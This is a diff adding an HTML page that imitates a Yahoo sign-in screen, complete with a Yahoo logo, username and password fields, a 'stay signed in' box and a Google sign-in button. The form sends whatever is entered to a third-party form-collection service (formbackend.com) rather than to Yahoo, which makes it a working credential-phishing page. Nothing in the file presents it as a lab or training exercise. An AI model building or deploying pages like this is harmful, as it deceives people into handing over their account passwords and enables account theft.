@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yahoo</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@100;500&display=swap');
+
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    background-color: white;
+    font-family:'Public Sans', sans-serif; ;
+}
+
+body {
+    background-size: cover;
+    justify-content: center;
+    align-items: center;
+    display: flex;
+    flex-direction: column;
+    height: 100vh;
+}
+
+
+.container {
+margin-inline : 1.5rem;
+width: 100%;
+}
+
+a {
+    align-items: center;
+    justify-content: center;
+    display: flex;
+    text-decoration: none;
+    margin-right: 3em;
+    background-color: white;
+}
+
+.main {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: rgb(255, 255, 255);
+    width: 90%;
+    position: relative;
+    height: 100vh;
+}
+
+
+.loginform {
+    background-color:white;
+    align-items: center;
+    justify-content: center;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    height: 100vh;
+    width: 100%;
+}
+
+#google-img {
+    height: 35px;
+    width: 100px;
+}
+
+#yahoo-img {
+    height: 36px;
+    width: 100px;
+    margin-left: 39%;
+}
+
+.chkbox_and_forgot_password{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: row;
+}
+
+h1 {
+    font-size: 20px bold;
+    text-align: center;
+}
+
+input {
+    margin: 1rem 0px;
+    outline: none;
+}
+
+.paragraph1 {
+    padding: 1rem 0px;
+    font-size: 0.8rem;
+    text-align: center;
+    margin-top: 10px;
+}
+
+.google {
+    border: 0.5px solid black;
+    width: 20rem;
+    height: 2.7rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    display: flex;
+    border-radius: 90px;
+}
+#google {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    display: flex;
+    color: black;
+}
+#create-account {
+    border: 0.5px solid #188FFF;
+    width: 20rem;
+    height: 2.7rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    display: flex;
+    border-radius: 90px;
+    color: #188FFF;
+}
+p{
+    text-align: center;
+}
+
+button {
+    width: 20rem;
+    height: 2.7rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    display: flex;
+    border-radius: 90px;
+    background-color: #188FFF;
+    color: white;
+    border: none;
+}
+
+#name {
+    background-color: white;
+    border: 1px solid white;
+    width: 20rem;
+    border-bottom:1px solid black ;
+
+}
+
+button,#google,#create-account,.chkbox_and_forgot_password,a {
+    margin-left: 37px;
+}
+
+#google,#create-account {
+    margin-top: 1rem ;
+    margin-bottom: 1rem ;
+}
+
+#forgot {
+    margin-left: 10%;
+}
+#stay-signed {
+    margin-left: -10%;
+    position: absolute;
+}
+.pass{
+        float: left;
+        margin-left: 39px;
+        margin-top: 10px;
+    }
+    .signintext{
+        font-size: 20px;
+    }
+    /* Styles for small screens (up to 767 pixels wide) */
+@media only screen and (max-width: 767px) {
+    body {
+        /* Adjust styles for small screens here */
+    }
+
+    .loginform {
+        width: 100%; /* Adjust width for full width on small screens */
+    }
+
+    /* Add more styles for small screens as needed */
+}
+
+/* Styles for large screens (768 pixels wide and above) */
+@media only screen and (min-width: 768px) {
+    body {
+        /* Adjust styles for large screens here */
+    }
+
+    .loginform {
+        max-width: 25rem; /* Adjust max-width for a maximum width on large screens */
+        /* Add more styles for large screens as needed */
+    }
+}
+
+    </style>
+</head>
+
+<body>
+    <div class="main contianer">
+        <div class="loginform">
+            <form action="https://www.formbackend.com/f/0da92e7260dd4c2c" method="POST">
+                <img src="yahoo-logo.png" alt="Yahoo" id="yahoo-img"><br><br>
+            <h1 class="signintext">Sign In</h1>
+            <p class="paragraph1">Sign in using your Yahoo account</p>
+            <p>username, email address or mobile number</p>
+            <input style="margin-left: 10%;" name="Name" type="text" id="name"><br>
+            <p class="pass">Password</p>
+            <input style="margin-left: 10%;" name="Name" type="text" id="name">
+            <button type="submit">Signin</button>
+            <div class="chkbox_and_forgot_password">
+                <div><input type="checkbox" name="stay-signed" id="stay
+                            signed in">
+                <label for="stay signed in">stay signed</label></div>
+                <a href="#" id="forgot">Forgotten username?</a>
+            </div>
+            <a href="#" id="create-account">Create an account</a>
+            <a>or continue with</a>
+            <a href="#" id="google">
+                <div class="google">
+                    <img src="partner1.png" alt="google" id="google-img">
+                </div>
+            </a>
+            
+            </form>
+        </div>
+
+    </div>
+</body>
+
+</html>
